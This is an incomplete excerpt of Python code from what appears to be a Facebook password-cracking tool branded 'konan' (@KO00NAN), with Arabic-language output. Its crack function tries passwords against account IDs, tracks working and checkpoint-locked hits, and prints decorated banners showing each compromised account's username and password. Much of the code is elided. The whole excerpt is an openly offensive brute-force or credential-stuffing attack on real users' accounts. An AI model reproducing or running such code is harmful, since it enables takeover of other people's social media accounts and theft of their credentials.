...
g= datetime.datetime(2023,11 , 8, 0, 00 ,0)
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s { كونان🇸🇩} %s/%s ➞ {صحيح} %s ➞ {سكيور} %s ➞ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️كونان جابلك حساب قافل 
⋘─────━𓆩konan🇸🇩𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
⋘─────━𓆩konan🇸🇩𓆪‏━─────⋙
  -  @KO00NAN					
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️كونان جابلك حساب شغال 
⋘─────━𓆩konan🇸🇩𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
⋘─────━𓆩konan🇸🇩𓆪‏━─────⋙
 @KO00NAN					
					...
					infoakun += f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 كونان جابلك حساب شغال ✔️
⋘─────━𓆩konan🇸🇩𓆪‏━─────⋙
